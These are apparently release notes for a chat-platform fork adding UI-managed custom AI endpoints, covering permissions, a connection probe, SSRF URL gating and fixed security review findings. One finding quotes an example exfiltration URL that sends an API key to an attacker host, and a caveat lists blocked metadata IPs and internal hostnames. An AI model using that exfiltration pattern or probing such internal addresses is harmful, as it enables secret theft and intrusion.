# v0.10.0 — UI-managed custom AI endpoints

## What changed

Adds a DB-backed CRUD surface for custom AI endpoints, exposed in the
SidePanel for both ADMIN and USER roles. Endpoints declared in
`librechat.yaml` continue to win on name collision; user-provided keys
still flow through the existing `SetKeyDialog` because the DB layer
mirrors the YAML `TEndpoint` shape exactly.

### New permission type
- `PermissionTypes.CUSTOM_ENDPOINTS` with `USE` / `CREATE` / `UPDATE`.
- Default role grants: ADMIN and USER both receive all three. The
  permission is backfilled at server startup via
  `updateInterfacePermissions`, so upgrading deployments do not need
  a manual migration.

### New backend surface
- `packages/data-schemas/src/schema/customEndpoint.ts` — Mongo schema
  with compound unique `(name, tenantId)`.
- `packages/data-schemas/src/methods/customEndpoint.ts` — CRUD method
  set with retry-on-collision on `create`.
- `packages/data-provider/src/types/customEndpoints.ts` —
  `customEndpointConfigSchema` extends `endpointSchema` with an
  optional `capabilities[]` field.
- `packages/api/src/auth/customDomain.ts` — `validateCustomEndpointBaseUrl`
  permissive sibling of the strict SSRF gate. Permits localhost /
  RFC1918 by default; `LIBRECHAT_STRICT_ENDPOINT_URLS=true` flips back
  to the strict posture used by web search and OAuth flows.
- `packages/api/src/endpoints/custom/db.ts` —
  `mergeCustomEndpointsByName(yaml, db)` enforcing YAML precedence on
  name collision.
- `packages/api/src/endpoints/custom/probe.ts` —
  `probeCustomEndpoint(config)` Test Connection probe with a 5-second
  `AbortController`, OpenAI-shape model count parsing, and
  `Authorization` header suppression when `apiKey` is the
  `user_provided` sentinel.
- `api/server/middleware/config/customEndpoints.js` plus an inline
  call from `configMiddleware` so every existing route picks up DB
  endpoints automatically. The middleware shallow-clones `req.config`
  before mutating to keep cached `AppConfig` instances clean across
  requests.
- `api/server/controllers/customEndpoints.js` +
  `api/server/routes/customEndpoints.js` — `GET / POST /
  PATCH / DELETE` and `POST /test`. Permission gate uses
  `generateCheckAccess(CUSTOM_ENDPOINTS, [USE]/[USE,CREATE]/[USE,UPDATE])`;
  row-level ownership (admin OR `record.author === req.user.id`) is
  enforced inside the controllers.

### New frontend surface
- `client/src/components/SidePanel/CustomEndpoints/` — Panel + Dialog
  + Card. Dialog presents capabilities as a multi-select, exposes a
  literal/`user_provided` API key radio, parses values through
  `customEndpointConfigSchema` before `Test Connection` and `Save`,
  and surfaces probe duration plus model count on success.
- `client/src/data-provider/CustomEndpoints/` — React Query hooks.
  Mutations invalidate `[customEndpoints, endpoints, models]` so the
  chat composer's model dropdown picks up changes immediately.
- `client/src/hooks/Nav/useSideNavLinks.ts` — registers the panel
  under `CUSTOM_ENDPOINTS.USE`.
- `client/src/locales/en/translation.json` — ~32 new
  `com_ui_custom_endpoint_*` and `com_ui_capability_*` keys.

## Why

Phases 1–8 of the Perplexity-style migration shipped a registry-driven
endpoint pipeline but no UI surface for users or admins to register
custom endpoints — they had to edit `librechat.yaml` and restart the
container. The deployment posture for this fork is single-user offline,
where a user adding their own local LLM box at
`http://192.168.1.50:8000/v1` is a primary workflow. This release
closes that gap.

## Migration steps

None for existing deployments. The DB tier is purely additive:
- Existing `librechat.yaml.endpoints.custom[*]` entries continue to
  load and continue to win on name collision (admin-as-code beats UI
  edits).
- The new permission type is backfilled at startup; no role-config
  changes are required.
- Existing per-user `SetKeyDialog` flows are preserved — DB endpoints
  with `apiKey: "user_provided"` route through the same code path.

## Breaking changes

None.

## Known caveats

- The default URL gate permits loopback / RFC1918 ranges, which
  matches the offline single-user posture but is more permissive than
  the strict gate used by web search and OAuth flows. Multi-tenant
  operators should set `LIBRECHAT_STRICT_ENDPOINT_URLS=true` to
  re-enable the strict posture for custom-endpoint baseURLs.
- Cloud metadata IPs (`169.254.169.254`), known internal service
  hostnames (including bare-label `mongodb`, `redis`, `rag_api`,
  `internal`, `local`, etc.), and `.internal` / `.local` TLDs remain
  blocked even in the permissive mode.
- DELETE on a custom endpoint does NOT cascade-clean per-user keys
  stored against the endpoint name; if you re-create a same-named
  endpoint shortly after deletion, existing user keys remain
  associated.
- The compound unique index `(name, tenantId)` is created at
  application startup via Mongoose's default `autoIndex: true`. If
  you have flipped `autoIndex: false` for production performance, run
  `CustomEndpoint.syncIndexes()` once to materialize the constraint;
  otherwise duplicate name detection in the model layer falls back to
  the controller-level pre-check + retry-on-E11000 (still safe, but
  the unique index is the canonical guarantee).
- Test Connection requires a literal `baseURL` — `${VAR}` placeholders
  are rejected by design. YAML-templated URLs continue to work at
  runtime via `initializeCustom`'s existing resolution path.

## Security review notes

The first reviewer pass identified three HIGH and ten MEDIUM
findings. All are fixed in this release:

- **API key cross-user visibility (H1).** `GET /api/custom-endpoints`
  list responses redact every literal `apiKey` to `null` and emit an
  `apiKeyProvided` boolean. The `user_provided` sentinel is preserved
  so the client can route to `SetKeyDialog`. Real keys are never
  returned to any caller.
- **Empty-string PATCH overwrite (H2).** PATCH requests now reject
  empty / whitespace-only `baseURL`, `apiKey`, and `name` before any
  validation; previously these slipped through a falsy `if`-check
  and erased valid records via the model's spread merge.
- **Probe URL exfil (H3).** `probeCustomEndpoint` no longer expands
  `${VAR}` placeholders inside `baseURL` or `headers`. A hostile
  user can no longer point an outbound GET at `https://attacker.com/${OPENAI_API_KEY}`.
  The literal user-typed URL is what's probed; YAML-templated URLs
  are evaluated at runtime by `initializeCustom`, not the probe.
- **Bare `internal` / `local` hostname bypass (M3)** — added to the
  always-blocked set.
- **Unbounded list (M7)** — `listCustomEndpoints` and
  `listCustomEndpointsByAuthor` are capped at 500 records.
- **DB-merge cache (M2)** — 30-second per-tenant TTL cache;
  invalidated on every CRUD write.
- **Case-insensitive merge (M9)** — generic case-insensitive name
  collision detection in `mergeCustomEndpointsByName` (preserves
  YAML-precedence rule across casing variations).
- Dialog now performs client-side URL parse before submit;
  capabilities are preserved through the type system; route doc
  comments match code; dead DI slot removed; relaxed Test Connection
  schema accepts endpoints without a known model list yet.
